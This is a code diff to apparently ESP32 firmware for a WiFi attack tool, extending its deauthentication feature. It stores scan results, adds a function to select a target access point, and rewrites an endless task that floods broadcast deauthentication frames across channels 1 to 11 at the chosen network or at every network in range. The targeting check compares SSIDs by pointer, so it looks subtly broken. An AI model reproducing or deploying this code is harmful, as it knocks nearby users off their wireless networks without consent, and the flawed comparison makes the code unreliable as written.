@@ -12,9 +12,13 @@
 #include <esp_random.h>
 #include <stdio.h>
 
+
+static uint16_t ap_count = 0;
+static wifi_ap_record_t* scanned_aps = NULL;
 static const char *TAG = "WiFiManager";
 static EventGroupHandle_t wifi_event_group;
 const int WIFI_CONNECTED_BIT = BIT0;
+static wifi_ap_record_t selected_ap = {};
 
 typedef enum {
     COMPANY_DLINK,
@@ -320,8 +324,24 @@ void wifi_manager_start_scan() {
 // Stop scanning for networks
 void wifi_manager_stop_scan() {
     ESP_ERROR_CHECK(esp_wifi_scan_stop());
-    ESP_LOGI(TAG, "WiFi scanning stopped.");
     wifi_manager_stop_monitor_mode();
+    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_num(&ap_count));
+
+    if (ap_count > 0) {
+        scanned_aps = malloc(sizeof(wifi_ap_record_t) * ap_count);
+        if (scanned_aps == NULL) {
+            ESP_LOGE(TAG, "Failed to allocate memory for AP info");
+            return;
+        }
+
+        ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&ap_count, scanned_aps));
+
+        ESP_LOGI(TAG, "Found %d access points", ap_count);
+    } else {
+        ESP_LOGI(TAG, "No access points found");
+    }
+    
+    ESP_LOGI(TAG, "WiFi scanning stopped.");
 }
 
 void wifi_manager_list_stations() {
@@ -392,31 +412,47 @@ esp_err_t wifi_manager_broadcast_deauth(uint8_t bssid[6], int channel, uint8_t m
 
 void wifi_deauth_task(void *param) {
     const char *ssid = (const char *)param;
-    uint16_t ap_count = 0;
-    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_num(&ap_count));
 
     if (ap_count == 0) {
         ESP_LOGI(TAG, "No access points found");
         return;
     }
 
-    wifi_ap_record_t *ap_info = malloc(sizeof(wifi_ap_record_t) * ap_count);
+    wifi_ap_record_t *ap_info = scanned_aps;
     if (ap_info == NULL) {
         ESP_LOGE(TAG, "Failed to allocate memory for AP info");
         return;
     }
 
 
-    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&ap_count, ap_info));
-
-
     while (1) {
-    for (int i = 0; i < ap_count; i++)
-        for (int y = 1; y < 12; y++)
+        if (strlen((const char*)selected_ap.ssid) > 0) // not 0 or NULL
         {
-            uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-            wifi_manager_broadcast_deauth(ap_info[i].bssid, y, broadcast_mac);
-            vTaskDelay(10 / portTICK_PERIOD_MS);
+            for (int i = 0; i < ap_count; i++)
+            {
+                if (selected_ap.ssid == ap_info[i].ssid)
+                {
+                    for (int y = 1; y < 12; y++)
+                    {
+                        uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+                        wifi_manager_broadcast_deauth(ap_info[i].bssid, y, broadcast_mac);
+                        vTaskDelay(10 / portTICK_PERIOD_MS);
+                    }
+                }
+                vTaskDelay(10 / portTICK_PERIOD_MS);
+            }
+        }
+        else 
+        {
+            for (int i = 0; i < ap_count; i++)
+            {
+                for (int y = 1; y < 12; y++)
+                {
+                    uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+                    wifi_manager_broadcast_deauth(ap_info[i].bssid, y, broadcast_mac);
+                    vTaskDelay(10 / portTICK_PERIOD_MS);
+                }
+            }
         }
     }
 }
@@ -432,6 +468,40 @@ void wifi_manager_start_deauth()
         ESP_LOGW(TAG, "Deauth transmission already running.");
     }
 }
+
+void wifi_manager_select_ap(int index)
+{
+    
+    if (ap_count == 0) {
+        ESP_LOGI(TAG, "No access points found");
+        return;
+    }
+
+    
+    wifi_ap_record_t *ap_info = scanned_aps;
+    if (ap_info == NULL) {
+        ESP_LOGE(TAG, "No AP info available (scanned_aps is NULL)");
+        return;
+    }
+
+
+    if (index < 0 || index >= ap_count) {
+        ESP_LOGE(TAG, "Invalid index: %d. Index should be between 0 and %d", index, ap_count - 1);
+        return;
+    }
+
+    
+    selected_ap = ap_info[index];
+
+    
+    ESP_LOGI(TAG, "Selected Access Point: SSID: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
+             selected_ap.ssid,
+             selected_ap.bssid[0], selected_ap.bssid[1], selected_ap.bssid[2],
+             selected_ap.bssid[3], selected_ap.bssid[4], selected_ap.bssid[5]);
+
+    printf("Selected Access Point Successfully\n");
+}
+
 
 void wifi_manager_stop_deauth()
 {
@@ -449,21 +519,18 @@ void wifi_manager_stop_deauth()
 
 // Print the scan results and match BSSID to known companies
 void wifi_manager_print_scan_results_with_oui() {
-    uint16_t ap_count = 0;
-    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_num(&ap_count));
-
     if (ap_count == 0) {
         ESP_LOGI(TAG, "No access points found");
         return;
     }
 
-    wifi_ap_record_t *ap_info = malloc(sizeof(wifi_ap_record_t) * ap_count);
+    wifi_ap_record_t *ap_info = scanned_aps;
     if (ap_info == NULL) {
         ESP_LOGE(TAG, "Failed to allocate memory for AP info");
         return;
     }
 
-    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&ap_count, ap_info));
+
     ESP_LOGI(TAG, "Found %d access points:", ap_count);
 
     for (int i = 0; i < ap_count; i++) {
@@ -479,7 +546,8 @@ void wifi_manager_print_scan_results_with_oui() {
                                   (company == 6) ? "Actiontec" :
                                   "Unknown";
 
-        ESP_LOGI(TAG, "SSID: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X, RSSI: %d, Company: %s",
+        ESP_LOGI(TAG, "[%d] SSID: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X, RSSI: %d, Company: %s",
+                 i,
                  ssid_str,
                  ap_info[i].bssid[0], ap_info[i].bssid[1], ap_info[i].bssid[2],
                  ap_info[i].bssid[3], ap_info[i].bssid[4], ap_info[i].bssid[5],
